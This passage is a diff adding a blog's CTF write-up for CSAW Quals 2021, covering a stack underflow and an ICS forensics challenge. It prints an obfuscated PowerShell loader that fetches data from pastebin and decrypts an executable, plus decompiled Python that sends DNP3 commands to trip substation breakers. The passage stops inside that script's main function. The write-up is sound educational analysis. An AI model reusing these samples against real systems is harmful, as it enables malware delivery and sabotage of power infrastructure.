@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>CSAW Quals CTF 2021</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/csaw-quals-2021/#haystack">Haystack</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/csaw-quals-2021/#tripping-breakers">Tripping Breakers</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/csaw-quals-2021/#procrastination-simulator">Procrastination Simulator</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/csaw-quals-2021/#scp-terminal">SCP Terminal</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/csaw-quals-2021/#enumeration">Enumeration</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>CSAW Quals CTF 2021</h1>
+    </header>
+
+    <div class="content">
+        <p>I competed in CSAW Quals with <a href="https://ret2rev.dev/">ret2rev</a>.  We ended in 88th place overall and 17th in the qualifying brackets (US Students). I've included writeups for the challenges I solved and thought were interesting enough to write about.</p>
+<span id="continue-reading"></span><h1 id="haystack"><a href="/csaw-quals-2021/haystack">Haystack</a></h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Help! I&#39;ve lost my favorite needle!
+</span><span>nc pwn.chal.csaw.io 5002
+</span></code></pre>
+<p><a href="/csaw-quals-2021/bins/haySTACK">haySTACK</a></p>
+<p><img src="/csaw-quals-2021/haystack_function.png" alt="" /></p>
+<p>🧐</p>
+<p>The only vulnerability I caught was an underflow in the haystack check -- it checked the upper bound but not the lower bound so we could guess any location on the stack. It also displays 4 bytes at the guessed location. I guessed with a negative number to leak the randomly generated location for the needle and then guessed that location.</p>
+<p><img src="/csaw-quals-2021/haystack_flag.png" alt="" /></p>
+<h1 id="tripping-breakers"><a href="/csaw-quals-2021/tripping-breakers">Tripping Breakers</a></h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Attached is a forensics capture of an HMI (human machine interface) containing scheduled tasks, registry hives, and user profile of an operator account. There is a scheduled task that executed in April 2021 that tripped various breakers by sending DNP3 messages. We would like your help clarifying some information. What was the IP address of the substation_c, and how many total breakers were tripped by this scheduled task? Flag format: flag{IP-Address:# of breakers}. For example if substation_c&#39;s IP address was 192.168.1.2 and there were 45 total breakers tripped, the flag would be flag{192.168.1.2:45}.
+</span></code></pre>
+<p>Looking around the filesystem finds us this lovely powershell script in Temp.</p>
+<pre data-lang="powershell" style="background-color:#212733;color:#ccc9c2;" class="language-powershell "><code class="language-powershell" data-lang="powershell"><span>$SCOP </span><span style="color:#f29e74;">= </span><span>((</span><span style="color:#f28779;">new-object</span><span> System.Net.WebClient).DownloadString(</span><span style="color:#bae67e;">&quot;https://pastebin.com/raw/rBXHdE85&quot;</span><span>)).Replace(</span><span style="color:#bae67e;">&quot;!&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;f&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;@&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;q&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;#&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;z&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;&lt;&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;B&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;%&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;K&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;^&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;O&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;&amp;&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;T&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;*&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;Y&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;[&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;4&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;]&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;9&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;{&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;=&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;</span><span>$SLPH </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#ffa759;">Text.Encoding</span><span>]::UTF8.GetString([</span><span style="color:#ffa759;">Convert</span><span>]::FromBase64String($SCOP))</span><span style="color:#ccc9c2cc;">; </span><span>$E</span><span style="color:#f29e74;">=</span><span>(</span><span style="color:#f28779;">Get-ItemProperty </span><span style="color:#f29e74;">-</span><span>Path $SLPH </span><span style="color:#f29e74;">-</span><span>Name Blast).</span><span style="color:#bae67e;">&quot;Blast&quot;</span><span style="color:#ccc9c2cc;">;</span><span>$TWR </span><span style="color:#f29e74;">=  </span><span style="color:#bae67e;">&quot;!M[[pcU09%d^kV&amp;l#9*0XFd]cVG93&lt;&quot;</span><span>.Replace(</span><span style="color:#bae67e;">&quot;!&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;SEt&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;@&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;q&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;#&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;jcm&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;&lt;&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;ZXI=&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;%&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;GVF&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;^&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;BU&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;&amp;&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;cTW&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;*&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;zb2Z&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;[&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;T&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;]&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;iZW1&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;{&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;Fdi&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;</span><span>$BRN </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#ffa759;">Text.Encoding</span><span>]::UTF8.GetString([</span><span style="color:#ffa759;">Convert</span><span>]::FromBase64String($TWR))</span><span style="color:#ccc9c2cc;">; </span><span>$D</span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#f28779;">Get-ItemProperty </span><span style="color:#f29e74;">-</span><span>Path $BRN </span><span style="color:#f29e74;">-</span><span>Name Off).</span><span style="color:#bae67e;">&quot;Off&quot;</span><span style="color:#ccc9c2cc;">;</span><span>openssl aes</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">256</span><span style="color:#f29e74;">-</span><span>cbc </span><span style="color:#f29e74;">-</span><span>a </span><span style="color:#f29e74;">-</span><span>A </span><span style="color:#f29e74;">-</span><span>d </span><span style="color:#f29e74;">-</span><span>salt </span><span style="color:#f29e74;">-</span><span>md sha256 </span><span style="color:#f29e74;">-in </span><span>$env:temp$D </span><span style="color:#f29e74;">-</span><span>pass pass:$E </span><span style="color:#f29e74;">-</span><span>out </span><span style="color:#bae67e;">&quot;c:\1\fate.exe&quot;</span><span style="color:#ccc9c2cc;">;
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ cat Registry/SOFTWARE_ROOT.json | jq | grep -i &quot;tabletpc..bell&quot; -A 10 -B 3
+</span><span>              &quot;LastWriteTimestamp&quot;: &quot;/Date(1617231964815)/&quot;,
+</span><span>              &quot;SubKeys&quot;: [
+</span><span>                {
+</span><span>                  &quot;KeyPath&quot;: &quot;ROOT\\Microsoft\\Windows\\TabletPC\\Bell&quot;,
+</span><span>                  &quot;KeyName&quot;: &quot;Bell&quot;,
+</span><span>                  &quot;LastWriteTimestamp&quot;: &quot;/Date(1617231990846)/&quot;,
+</span><span>                  &quot;SubKeys&quot;: [],
+</span><span>                  &quot;Values&quot;: [
+</span><span>                    {
+</span><span>                      &quot;ValueName&quot;: &quot;Blast&quot;,
+</span><span>                      &quot;ValueType&quot;: &quot;RegSz&quot;,
+</span><span>                      &quot;ValueData&quot;: &quot;M4RK_MY_W0Rd5&quot;,
+</span><span>                      &quot;DataRaw&quot;: &quot;TQA0AFIASwBfAE0AWQBfAFcAMABSAGQANQAAAA==&quot;,
+</span><span>                      &quot;Slack&quot;: &quot;&quot;
+</span><span>❯ cat Registry/SOFTWARE_ROOT.json | jq | grep -i &quot;wbem..tower&quot; -A 10 -B 3
+</span><span>              &quot;Values&quot;: []
+</span><span>            },
+</span><span>            {
+</span><span>              &quot;KeyPath&quot;: &quot;ROOT\\Microsoft\\Wbem\\Tower&quot;,
+</span><span>              &quot;KeyName&quot;: &quot;Tower&quot;,
+</span><span>              &quot;LastWriteTimestamp&quot;: &quot;/Date(1617231936549)/&quot;,
+</span><span>              &quot;SubKeys&quot;: [],
+</span><span>              &quot;Values&quot;: [
+</span><span>                {
+</span><span>                  &quot;ValueName&quot;: &quot;Off&quot;,
+</span><span>                  &quot;ValueType&quot;: &quot;RegSz&quot;,
+</span><span>                  &quot;ValueData&quot;: &quot;\\EOTW\\151.txt&quot;,
+</span><span>                  &quot;DataRaw&quot;: &quot;XABFAE8AVABXAFwAMQA1ADEALgB0AHgAdAAAAA==&quot;,
+</span><span>                  &quot;Slack&quot;: &quot;&quot;
+</span></code></pre>
+<p>So, turns out Powershell actually exists on Linux -- I used it to evaluate these subcommands. The more you know!  It decrypts EOTW\151.txt with "M4RK_MY_W0Rd5" as the password and then runs the result, so I run it to decrypt fate.exe. I opened it up in Binary Ninja, cried a little bit, and then realized it was a package python script with PyInstaller. I hit it with <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a> and uncompyle6 to get this lightly modified python file.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">## uncompyle6 version 3.7.4
+</span><span style="font-style:italic;color:#5c6773;">## Python bytecode 3.6 (3379)
+</span><span style="font-style:italic;color:#5c6773;">## Decompiled from: Python 3.6.0 (default, Mar  3 2017, 23:25:37) 
+</span><span style="font-style:italic;color:#5c6773;">## [GCC 5.3.0]
+</span><span style="font-style:italic;color:#5c6773;">## Embedded file name: trip_breakers.py
+</span><span style="color:#ffa759;">import </span><span>struct</span><span style="color:#ccc9c2cc;">, </span><span>socket</span><span style="color:#ccc9c2cc;">, </span><span>time</span><span style="color:#ccc9c2cc;">, </span><span>sys
+</span><span style="color:#ffa759;">from </span><span>crccheck</span><span style="color:#f29e74;">.</span><span>crc </span><span style="color:#ffa759;">import </span><span>Crc16Dnp
+</span><span>OPT_1 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">3
+</span><span>OPT_2 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">4
+</span><span>OPT_3 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">66
+</span><span>OPT_4 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">129
+</span><span style="color:#ffa759;">class </span><span style="color:#73d0ff;">Substation</span><span>:
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#f28779;">__init__</span><span>(</span><span style="color:#ffcc66;">self</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">ip_address</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">devices</span><span>):
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>target </span><span style="color:#f29e74;">= </span><span>ip_address
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>devices </span><span style="color:#f29e74;">= </span><span>[]
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>src </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">50
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>transport_seq </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>app_seq </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">10
+</span><span>        </span><span style="color:#ffa759;">for </span><span>device </span><span style="color:#ffa759;">in </span><span>devices:
+</span><span>            </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add_device</span><span>(device)
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">connect</span><span>()
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">connect</span><span>(</span><span style="color:#ffcc66;">self</span><span>):
+</span><span>        </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&#39;Connecting to </span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">...&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>target))
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>socket </span><span style="color:#f29e74;">= </span><span>socket</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">socket</span><span>(socket</span><span style="color:#f29e74;">.</span><span>AF_INET</span><span style="color:#ccc9c2cc;">, </span><span>socket</span><span style="color:#f29e74;">.</span><span>SOCK_STREAM)
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>socket</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">connect</span><span>((</span><span style="color:#bae67e;">&quot;127.0.0.1&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">20000</span><span>))
+</span><span>        </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&#39;Connected to </span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>target))
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">add_device</span><span>(</span><span style="color:#ffcc66;">self</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">device</span><span>):
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>devices</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>({</span><span style="color:#bae67e;">&#39;dst&#39;</span><span style="color:#ccc9c2cc;">:</span><span>device[</span><span style="color:#ffcc66;">0</span><span>]</span><span style="color:#ccc9c2cc;">,  </span><span style="color:#bae67e;">&#39;count&#39;</span><span style="color:#ccc9c2cc;">:</span><span>device[</span><span style="color:#ffcc66;">1</span><span>]})
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">activate_all_breakers</span><span>(</span><span style="color:#ffcc66;">self</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">code</span><span>):
+</span><span>        </span><span style="color:#ffa759;">for </span><span>device </span><span style="color:#ffa759;">in </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>devices:
+</span><span>            dnp3_header </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">get_dnp3_header</span><span>(device[</span><span style="color:#bae67e;">&#39;dst&#39;</span><span>])
+</span><span>            </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span>device[</span><span style="color:#bae67e;">&#39;count&#39;</span><span>] </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2</span><span>):
+</span><span>                </span><span style="color:#ffa759;">global </span><span>count
+</span><span>                dnp3_packet </span><span style="color:#f29e74;">= </span><span>dnp3_header </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">get_dnp3_data</span><span>(x</span><span style="color:#ccc9c2cc;">, </span><span>OPT_1</span><span style="color:#ccc9c2cc;">, </span><span>code)
+</span><span>                </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>socket</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(dnp3_packet)
+</span><span>                </span><span style="font-style:italic;color:#5c6773;"># time.sleep(2)
+</span><span>                dnp3_packet </span><span style="color:#f29e74;">= </span><span>dnp3_header </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">get_dnp3_data</span><span>(x</span><span style="color:#ccc9c2cc;">, </span><span>OPT_2</span><span style="color:#ccc9c2cc;">, </span><span>code)
+</span><span>                </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>socket</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(dnp3_packet)
+</span><span>                </span><span style="font-style:italic;color:#5c6773;"># time.sleep(5)
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">get_dnp3_header</span><span>(</span><span style="color:#ffcc66;">self</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">dst</span><span>):
+</span><span>        data </span><span style="color:#f29e74;">= </span><span>struct</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">pack</span><span>(</span><span style="color:#bae67e;">&#39;&lt;H2B2H&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">25605</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">24</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">196</span><span style="color:#ccc9c2cc;">, </span><span>dst</span><span style="color:#ccc9c2cc;">, </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>src)
+</span><span>        data </span><span style="color:#f29e74;">+= </span><span>struct</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">pack</span><span>(</span><span style="color:#bae67e;">&#39;&lt;H&#39;</span><span style="color:#ccc9c2cc;">, </span><span>Crc16Dnp</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">calc</span><span>(data))
+</span><span>        </span><span style="color:#ffa759;">return </span><span>data
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">get_dnp3_data</span><span>(</span><span style="color:#ffcc66;">self</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">index</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">function</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">code</span><span>):
+</span><span>        data </span><span style="color:#f29e74;">= </span><span>struct</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">pack</span><span>(</span><span style="color:#bae67e;">&#39;&lt;10BIH&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">192 </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>transport_seq</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">192 </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>app_seq</span><span style="color:#ccc9c2cc;">, </span><span>function</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">12</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">23</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span>index</span><span style="color:#ccc9c2cc;">, </span><span>code</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">500</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)
+</span><span>        data </span><span style="color:#f29e74;">+= </span><span>struct</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">pack</span><span>(</span><span style="color:#bae67e;">&#39;&lt;H&#39;</span><span style="color:#ccc9c2cc;">, </span><span>Crc16Dnp</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">calc</span><span>(data))
+</span><span>        data </span><span style="color:#f29e74;">+= </span><span>struct</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">pack</span><span>(</span><span style="color:#bae67e;">&#39;&lt;HBH&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">65535</span><span>)
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>transport_seq </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>app_seq </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>        </span><span style="color:#ffa759;">if </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>transport_seq </span><span style="color:#f29e74;">&gt;= </span><span style="color:#ffcc66;">62</span><span>:
+</span><span>            </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>transport_seq </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>        </span><span style="color:#ffa759;">if </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>app_seq </span><span style="color:#f29e74;">&gt;= </span><span style="color:#ffcc66;">62</span><span>:
+</span><span>            </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>app_seq </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>        </span><span style="color:#ffa759;">return </span><span>data
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># if socket.gethostname() != &#39;hmi&#39;:
+</span><span>    </span><span style="font-style:italic;color:#5c6773;">#     sys.exit(1)
+</span><span>    substation_a </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.80&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">19</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">8</span><span>)])
+</span><span>    substation_b </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.81&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">9</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">7</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">20</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">12</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">15</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">19</span><span>)])
+</span><span>    substation_c </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.82&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">14</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">14</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">9</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">16</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">15</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">12</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5</span><span>)])
+</span><span>    substation_d </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.83&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">20</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">17</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">8</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">14</span><span>)])
